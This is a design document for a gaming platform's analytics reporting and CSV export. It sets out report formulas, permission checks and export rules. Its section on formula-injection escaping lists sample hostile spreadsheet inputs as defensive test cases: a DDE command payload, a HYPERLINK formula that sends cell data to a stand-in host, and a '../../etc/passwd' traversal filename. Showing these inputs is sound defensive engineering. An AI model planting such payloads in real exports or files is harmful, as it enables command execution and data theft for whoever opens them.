# Phase 2D.7 — Report Definitions & Export Format

Every report the platform produces, its exact source, the authorization required, and the precise CSV
contract. Nothing here is estimated or defaulted.

Metric-level formulas live in
[PHASE_2D6_ANALYTICS_DEFINITIONS.md](PHASE_2D6_ANALYTICS_DEFINITIONS.md) — reports are assembled from
those same computations, so a report can never disagree with the dashboard.

---

## 0. Rules that apply to every report

| Rule | Statement |
|---|---|
| **Single computation** | Reports call `AnalyticsService`. There is exactly one implementation of each figure, used by both the dashboard and the report. Verified by integration test (`a report agrees with the dashboard it mirrors`). |
| **Timezone** | **UTC, always.** Windows are half-open `[from, to)`; daily grouping uses `date_trunc('day', created_at AT TIME ZONE 'UTC')`. |
| **Range** | Default last 30 days. Maximum = `ANALYTICS_MAX_RANGE_DAYS` (default **366**). Over-limit ranges are **rejected with `400`**, never truncated. |
| **Currency** | Rows stay **per currency**. Nothing is summed across currencies — `exchange_rates` is empty, so no FX source exists. |
| **Missing values** | A value that cannot be computed is **`null` → an EMPTY CSV cell**, never `0`. A genuine measured zero is written as `0`. |
| **Read-only** | Reports and exports issue reads only. Proven by unit test (mock exposes no write methods) and integration test (balances, ledger, transaction/round/cashier counts identical before and after building AND exporting every report). |
| **No per-user data** | No report accepts a user selector or emits a `userId` or email. These are platform aggregates. |
| **Self-describing** | Every export carries a metadata envelope: type, range, timezone, filters, generation time, row count, metric definitions, and the list of unavailable metrics. |

### Filters (identical to the analytics routes)

| Filter | Effect |
|---|---|
| `from`, `to` | ISO-8601 UTC. Half-open window. |
| `currency` | ISO code. **An unknown code returns an EMPTY report, never platform-wide totals.** |
| `gameKey` | Exact `game_rounds.game_key`. Unknown key ⇒ empty. |
| `type` | **Required.** One of the six below; anything else is `400` at validation. |

---

## 1. Authorization (Part I)

All report and export routes are guarded by the **existing** `analytics:read` permission — the
narrowest that fits, since a report exposes exactly the analytics data and nothing more. **No new
permission was invented, and no mutation permission (`wallets:adjust` in particular) is involved.**

Verified live against real principals:

| Principal | Report | Export |
|---|---|---|
| Unauthenticated | **401** | **401** |
| `user` (real player) | **403** | **403** |
| `moderator` (real role; has `audit:read`, `security:read`, **not** `analytics:read`) | **403** | **403** |
| `admin` (`ADMIN_PERMS` includes `analytics:read`) | **200** | **200** |
| `super_admin` (`ALL_PERMISSIONS`) | **200** | **200** |

Being merely authenticated is never sufficient (the Phase 2D.2 rule).

---

## 2. The six reports

### 2.1 `financial` — Financial activity (LEDGER-level)

Columns: `metric, type, currency, count, amount`

| Metric row | Formula | Source |
|---|---|---|
| `transaction_volume` | `count(*)`, `SUM(amount)` grouped by transaction type + currency | `wallet_transactions` |
| `fees` | `SUM(fee)` per currency across all types | `wallet_transactions.fee` |
| `avg_completed_deposit` | `AVG(amount) WHERE status = COMPLETED` per currency | `deposit_requests` |
| `avg_completed_withdrawal` | `AVG(amount) WHERE status = COMPLETED` per currency | `withdrawal_requests` |

**Measure note (shipped in the file):** ledger-level. One interactive round can produce several
wallet transactions, so these totals are **NOT** the same measure as the gaming report's stake/payout.

**Declared unavailable in this report:** `revenue`, `expenses`, `profit`, `partnerProfit`,
`consolidatedCurrencyTotal`. `fees` is fee revenue actually recorded on transactions — **not**
platform revenue, gross gaming revenue, or margin.

### 2.2 `gaming` — Gaming activity (GAME-level)

Columns: `metric, currency_or_game, count, stake, payout, avg_stake, payout_to_stake_ratio`

| Metric row | Formula |
|---|---|
| `stake_and_payout` | `SUM`/`AVG` of `game_rounds.stake`/`.payout` for rounds in `SETTLED, RECOVERED, RESOLVED`, per currency |
| `payout_to_stake_ratio` | `SUM(payout)/SUM(stake)`. **EMPTY when stake is zero** (undefined, not 0). Realised ratio for the window — **NOT certified RTP** |
| `rounds_by_game` | `count(*)` by `game_key`, all statuses, **top 15 by round count** |
| `outcome_wins` / `outcome_losses` / `outcome_ties` | Derived from the money result: wins = `payout > stake`, ties = `payout = stake`, losses = remainder. No win flag is stored |
| `rounds_total_all_statuses` | `count(*)`, every status |
| `rounds_settled` | `count(*)` over the three settled statuses |

### 2.3 `cashier` — Cashier activity

Columns: `flow, status, currency, count, amount`

| Metric row | Formula |
|---|---|
| `deposit` | `count(*)`, `SUM(amount)` by status + currency, `deposit_requests` |
| `withdrawal` | `count(*)`, `SUM(amount)` by status + currency, `withdrawal_requests` |
| `deposit_queue` | `count(*) WHERE status IN (PENDING, PROCESSING)` |
| `withdrawal_queue` | `count(*) WHERE status IN (PENDING, UNDER_REVIEW)` |

**Windowing caveat (in the file):** rows are windowed on request **creation** time, not completion
time. **Netting caveat:** deposits and withdrawals are reported separately and are **never netted**
into a single "net flow" figure.

### 2.4 `operations` — Operational & recovery

Columns: `metric, basis, value`

| Metric row | Basis | Formula |
|---|---|---|
| `pending_settlements` | **point_in_time** | `game_rounds` in `PENDING_SETTLEMENT` |
| `recovering` | **point_in_time** | `game_rounds` in `RECOVERING` |
| `recovery_failed` | **point_in_time** | `game_rounds` in `RECOVERY_FAILED` — rounds needing manual intervention |
| `notifications_created` | in_range | `notifications` written. **In-app records, NOT external delivery** |
| `notifications_unread` | in_range | of those, `read_at IS NULL` now |
| `security_event:<type>` | in_range | `security_events` grouped by type |

`point_in_time` rows deliberately **ignore the date filter** — changing the range will not move them.

### 2.5 `users` — Account & activity

Columns: `metric, basis, value`

| Metric row | Basis | Formula / caveat |
|---|---|---|
| `registered` | point_in_time | `count(*) WHERE deleted_at IS NULL` |
| `email_verified` | point_in_time | Email only — **not KYC** |
| `status:<STATUS>` | point_in_time | grouped by `users.status` |
| `played` | in_range | `count(DISTINCT user_id)` over `game_rounds`. **NOT DAU** |
| `deposited` / `withdrew` | in_range | `count(DISTINCT user_id)` over COMPLETED cashier rows |
| `logged_in` | in_range | `count(DISTINCT user_id)` over successful `login_history`. **NOT DAU, not sessions, not visits** |
| `deposit_conversion_rate` | in_range | depositors ÷ all registered. **EMPTY when no registered users.** DEPOSIT conversion only — **not marketing conversion** |

**Declared unavailable:** `dau`, `mau`, `retention`, `ltv`, `sessionTime`, `bounceRate`,
`marketingConversion`.

### 2.6 `security-audit` — Security & audit

Columns: `metric, basis, value`

| Metric row | Value | Explanation |
|---|---|---|
| `audit_trail_records` | real count | `audit_trails` — the platform's **ACTIVE** audit store |
| `admin_audit_records` | **EMPTY** | `admin_audit_logs` has **no writer** and 0 rows all-time. Reported empty rather than `0`, because `0` would read as "no admin actions were audited" — they are, in `audit_trails` |
| `total_audit_records` | **EMPTY, always** | **No combined total is ever produced.** The stores share no correlating key (`entity_type`/`entity_id` vs `resource`/`resource_id`, no FK), so overlap could never be detected or deduplicated |
| `security_events` | real count | `security_events` in range |
| `audit_action:<ACTION>` | real count | `audit_trails` grouped by action |
| `audit_entity:<TYPE>` | real count | `audit_trails` grouped by entity type |
| `security_type:<TYPE>` | real count | `security_events` grouped by type |

Full evidence for the audit-store determination: [PHASE_2D7_AUDIT.md §3](PHASE_2D7_AUDIT.md).

---

## 3. CSV export contract

`GET /analytics/reports/export.csv?type=<type>[&from&to&currency&gameKey]`

| Property | Value |
|---|---|
| **Encoding** | UTF-8 **with BOM** (`EF BB BF`). The BOM is present because these are operator reports opened in Excel, which otherwise mis-decodes UTF-8. Programmatic consumers must expect it |
| **Line terminator** | `\r\n` (RFC 4180), including a trailing terminator |
| **Quoting** | RFC 4180: a field containing `"`, `,`, `\n` or `\r` is wrapped in double quotes and inner quotes are doubled |
| **Column order** | Fixed per report type (§2) and stable across releases. The header is the first line |
| **Row order** | The order the aggregation returns. **No ordering guarantee is claimed** beyond `daily` series, which are `ORDER BY date ASC` |
| **Empty cell** | `null` → empty (`a,,c`). **Never `0`, never the text `null`** |
| **Envelope** | After the header, `#`-prefixed rows carry: report title, type, `range_from_utc`, `range_to_utc`, timezone, currency filter, game filter, `generated_at_utc`, row count, one `# definition:<metric>` per metric, and one `# unavailable:<metric>` per unavailable metric. Then a blank row, then data |
| **Content-Type** | `text/csv; charset=utf-8` |
| **Content-Disposition** | `attachment; filename="<type>-<from>_to_<to>.csv"` — passed through `safeFilename` |
| **Other headers** | `X-Content-Type-Options: nosniff`, `Cache-Control: no-store` |
| **Max size** | Bounded by `MAX_REPORT_ROWS` = 50,000 **and** the range ceiling. Largest measured export: **2,149 bytes** |
| **At the limit** | **`400` rejection** stating "The report was NOT truncated." No silent truncation |
| **Authorization** | `analytics:read`, identical to the JSON route. The client fetches it as a **blob through the authenticated API client**, not via `window.open`, because the route requires a bearer header |

### 3.1 Formula-injection escaping

A spreadsheet treats a cell beginning `=`, `+`, `-`, `@`, TAB or CR as a formula. Such a value coming
from a database text column would execute on open.

**Rule:** a cell whose first character is one of those is prefixed with `'` — **unless the value
parses as a plain number.**

That exception is essential and is tested: `-1250.00` also begins with `-`, and mangling it would
cause exactly the financial misstatement the escaping exists to prevent. The numeric pattern is
deliberately strict (optional sign, digits, one optional decimal part, optional exponent), so
`-1+1`, `-1e3-cmd` and `+1-2+3` do **not** qualify and are escaped.

| Input | Output | Why |
|---|---|---|
| `=cmd\|' /C calc'!A0` | `'=cmd\|' /C calc'!A0` | neutralised |
| `@SUM(1+9)*cmd\|…` | `'@SUM(1+9)*cmd\|…` | neutralised |
| `=HYPERLINK("http://evil.test?x="&A1,…)` | `'=HYPERLINK(…)` | neutralised |
| `-1250.00` | `-1250.00` | **untouched** — legitimate negative money |
| `-9544233.099999999999998` | unchanged | **untouched** — ledger decimals travel as strings |
| `-1+1` | `'-1+1` | escaped — not a number |
| `=A1,"x"` | `"'=A1,""x"""` | apostrophe first, then RFC-4180 quoting |

Verified end-to-end: a formula planted in `game_rounds.game_key` **reached the exported file** and
was neutralised, while the numbers beside it were untouched — and the test asserts the payload really
did reach the file, so it cannot pass vacuously.

### 3.2 Filename safety

`safeFilename` replaces everything outside `[A-Za-z0-9._-]`, collapses runs of dots, and strips
leading dots/dashes. Consequences: no path separator, no `..`, no quote, no CR/LF header break, and
never an empty name. `../../etc/passwd` → `etc-passwd`.

Additionally, `type` is validated by `@IsIn(REPORT_TYPES)`, so a traversal-shaped value is a `400`
before it can influence a filename at all.

---

## 4. Limitations of the reporting layer

- **L-R1 — No scheduled or emailed reports.** Generation is on-demand only.
- **L-R2 — CSV only.** No PDF, XLSX or JSON-file export. No dependency was added for one format.
- **L-R3 — No streaming.** Reports are aggregates (largest measured export 2 KB), so the whole
  document is built in memory. This would need revisiting if a row-level report were ever added.
- **L-R4 — No row-level detail reports.** Every report is an aggregate; there is no per-transaction
  or per-round export. That is deliberate — a row-level export would carry user identifiers.
- **L-R5 — No player-facing export.** Not required by the client requirements ([audit §5](PHASE_2D7_AUDIT.md)).
- **L-R6 — No ordering guarantee** beyond the daily series.
- **L-R7 — Cashier rows are windowed on creation time**, not completion time (inherited from 2D.6 L2).
